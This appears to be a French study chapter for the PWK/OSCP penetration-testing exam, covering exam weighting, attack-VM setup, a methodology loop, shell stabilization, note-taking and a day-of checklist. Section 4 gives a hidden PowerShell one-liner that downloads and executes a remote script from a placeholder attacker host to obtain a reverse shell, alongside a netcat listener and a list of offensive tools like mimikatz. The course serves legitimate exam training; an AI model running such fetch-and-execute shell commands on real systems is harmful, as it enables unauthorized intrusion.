# 01 — General Course Introduction (PWK)

## Objectifs
Comprendre le cadre de l'examen, préparer une VM fiable, et adopter une méthodologie reproductible.

---

## 1. Ce que l'examen évalue vraiment

| Domaine (pondération) | Ce qu'il faut savoir faire |
|---|---|
| Identifying Vulnerabilities (12 %) | énumérer un service et reconnaître une piste |
| Exploiting Systems (11 %) | obtenir un shell de façon reproductible |
| Escalating Privileges (18 %) | root/admin sur Linux et Windows |
| Active Directory (26 %) | énumérer, attaquer l'auth, se déplacer |
| Documenting Findings (33 %) | rapport complet et preuves |

**33 % du score = le rapport.** Un shell non documenté ne vaut presque rien.

---

## 2. Préparer la VM d'attaque

```bash
# Snapshot avant l'examen : VM propre, outils testés, pas de mise à jour le jour J
sudo apt update && sudo apt full-upgrade -y
sudo apt install -y kali-linux-headless

# Vérifications
nmap --version
python3 --version
gcc --version
```

### Ce qui doit être prêt hors ligne
- Wordlists (rockyou, SecLists) — **sur disque**, pas de téléchargement
- Binaires Windows : `winPEASx64.exe`, `PowerUp.ps1`, `PrintSpoofer64.exe`, `GodPotato.exe`, `nc.exe`, `mimikatz.exe`, `chisel.exe`, `ligolo-agent.exe`
- Binaires Linux : `linpeas.sh`, `pspy64`, `chisel`
- Scripts perso testés (énumération, privesc, transfert)

```bash
# Serveur de partage prêt
cd /opt/tools && python3 -m http.server 80
```

---

## 3. Méthodologie en boucle

```
1. SCAN      → quels ports ouverts ? (tous, pas juste top 1000)
2. IDENTIFY  → versions, technologies, vhosts, users
3. RESEARCH  → version → CVE → exploit public (searchsploit, GitHub)
4. EXPLOIT   → compréhension du PoC, adaptation (LHOST/LPORT, offsets, chemins)
5. SHELL     → stabiliser (TTY), noter
6. ENUMERATE → local : users, services, cron, SUID, tokens, sauvegardes
7. ESCALATE  → root/admin, noter la preuve
8. PIVOT     → nouvelles interfaces réseau
9. DOCUMENT  → à chaque étape
```

### Règle des 90 minutes
- 90 min sans progrès sur une machine → **changer de machine**, y revenir plus tard avec un œil neuf.
- 20 min sans progrès sur un service → noter et passer au suivant.

---

## 4. Stabiliser un shell (réflexe n°1)

```bash
# Listener
rlwrap nc -lvnp 4444

# Linux → TTY complet
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm; export SHELL=/bin/bash
stty rows 40 cols 180

# Alternative sans python
script -qc /bin/bash /dev/null
# Alternative perl
perl -e 'exec "/bin/sh";'
```

```powershell
# Windows : éviter les shells fragiles
# Utiliser nc.exe ou un reverse powershell encodé
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')"
```

---

## 5. Prendre des notes utiles

```bash
# Journalisation systématique
script -a /root/exam/00-notes/session.log
```

Pour chaque action réussie, noter **immédiatement** :
1. La commande exacte (copiable)
2. La sortie significative
3. L'heure
4. Le fichier de preuve

```bash
mkdir -p /root/exam/03-loot/<IP>
whoami; hostname; ip a > /root/exam/03-loot/<IP>/proof.txt
```

---

## 6. Erreurs qui coûtent l'examen

| Erreur | Coût |
|---|---|
| Scanner seulement les 1000 ports | machine « sans service » ratée |
| Oublier de tester les creds trouvés ailleurs | pivot manqué |
| Utiliser Metasploit sur 2 machines | machine non validée |
| Pas de snapshot VM | perte de temps en cas de casse |
| Écrire le rapport après | 24 h insuffisantes, preuves perdues |
| S'acharner | temps mort sur 3 machines |
| Shell non stabilisé | commandes interactives impossibles (su, ssh, vi) |

---

## 7. Checklist J-0

- [ ] VM snapshotée, outils à jour **avant** le jour J
- [ ] Wordlists et binaires en local
- [ ] Dossier `/root/exam/` créé avec sous-dossiers
- [ ] Template de rapport prêt
- [ ] Tableau de suivi des cibles ouvert
- [ ] `script` lancé pour journaliser
- [ ] Eau, nourriture, alarmes réglées
- [ ] Aucune IA ouverte
